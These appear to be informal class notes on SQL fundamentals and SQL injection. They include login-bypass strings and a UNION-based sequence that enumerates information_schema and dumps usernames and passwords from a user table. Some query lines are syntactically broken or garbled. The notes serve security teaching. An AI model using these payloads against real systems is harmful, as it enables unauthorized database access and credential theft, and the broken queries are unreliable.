# DAY 3

SQL - Structured Query Language
  - language used to interact with relational database management systems (rdms)
    - relational databases - data organized based off logical relationships and can be accessed or reassembled in different way wihtout the need to reorganize the data
      - databases are broken into **tables**, tables contain **Columns/Fields** and **rows** which contain data
        - each table has a unique primary key 
      - ***by default, `information_schema`, `performance_schema`, and `mysql` are databases in mysql***
      - all sql queries end in semicolons
    - `use [database];`
    - `show tables;`
    - `select * from [table];`
    - `select [column name] from [table];`


### SQL INJECTION
- Require Valid SQL Queries
- Fully patched systems can be vulnerable due to misconfiguration
- Input Field Sanitization
- String vs Integer Values
- Is **information_schema** Database available?
- GET(URL) Request versus POST(INPUT THING) Request HTTP methods

`select id where user='deez' and passwd='jcac'`

something about putting `' or 1='1` in a username and/or input spot

`badurl.com/login.php?user=' or 1='1 & passwd=' or '1`

`login.php?<COPYANDPASTEDRAWREQEUSTDATA>`

once you find an option that is vulnerable: (audi)
  - you have to figure out how many columns are in the table, will never be less than what was originally found, but can be more
  - `Audi' UNION SELECT 1,2,3,4;#` (add more columns to figure it out)
  - in example, 1345 columns are available
  - `Audi' UNION SELECT table_name,2,table_schema,column_name,5, FROM information_schema.columns; #`
    - dumps the whole database in a really weird format
    - `Audi' UNION SELECT table_name,2,table_schema,column_name,5, FROM information_schema.columns WHERE table_schema='session'; #`
    - `Audi' UNION SELECT id,2,name,pass,5 FROM session.user; #
    - @@version



\',1)#









